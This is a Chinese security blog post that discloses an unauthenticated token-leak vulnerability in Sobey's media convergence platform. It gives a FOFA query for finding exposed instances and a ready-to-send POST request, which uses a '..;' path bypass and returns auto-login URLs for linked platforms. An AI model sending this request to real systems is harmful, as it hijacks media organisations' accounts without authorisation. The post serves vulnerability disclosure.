---
title: "索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露"
source: https://mrxn.net/jswz/sobey-thirdPlatToto-getUserBindUrl-token-leak.html
asset_dir: assets/索贝融媒体-mchthirdplattotogetuserbindurl-信息泄露
---

# 索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/23 08:15
- 880浏览
- [0评论](#comment)
- 8分钟阅读

深入探索

软件

计算机安全

身份验证

---

# 漏洞简介

索贝融媒体是一款由成都索贝数码科技股份有限公司开发的综合性融媒体解决方案与平台，广泛应用于各级电视台和媒体机构，旨在实现互联网与电视内容的融合生产、管理与分发，为媒体业务运营提供全面的支撑。

漏洞扫描服务

该漏洞存在于索贝融媒体系统的 `/mch/thirdPlatToto/getUserBindUrl` 接口中。[未经授权](https://mrxn.net/tag/%E6%9C%AA%E6%8E%88%E6%9D%83)的访问者通过直接访问此接口，即可触发[信息泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)。

此漏洞可能导致系统内部敏感信息的泄露，特别是能够获取到包含认证令牌（token）的系统URL。攻击者一旦获取这些带有有效令牌的URL，便可能利用这些信息绕过身份验证机制，进一步访问受保护的系统资源或执行未经授权的操作，从而对系统的安全性构成潜在威胁。

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

直接访问就返回携带视频兔兔平台的自动登录token的url，登录后的危害不多说，作为融媒体，这么多媒体平台账户的权限，懂得都洞！

# 漏洞复现

深入探索

物流软件安全

服务器安全服务

Windows安全工具

```
POST /sobey-mchEditor/js/..;/mch/thirdPlatToto/getUserBindUrl HTTP/1.1
Host: sobey.mrxn.net
Content-Type: application/x-www-form-urlencoded

siteCode=&token=
```

[![索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露](images/img-001-df7c7c645326.webp)](https://image.mrxn.net/d3af935191564ee2a524ca8df2937265.webp)

访问响应的url 即可直接登录视频兔兔平台

网络安全

[![索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露](images/img-002-e92dad2cf730.webp)](https://image.mrxn.net/44f9f16fa7774e7096f04623ed084145.webp)

以及对应的文章平台

安全运维咨询

深入探索

安全研究报告

编码转换工具

云安全解决方案

[![索贝融媒体 /mch/thirdPlatToto/getUserBindUrl 信息泄露](images/img-003-8ef84e70c9dc.webp)](https://image.mrxn.net/6baf3d497cfb4235a01359d3e0e34776.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#0day](https://mrxn.net/tag/0day)
- [#泄露](https://mrxn.net/tag/%E6%B3%84%E9%9C%B2)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
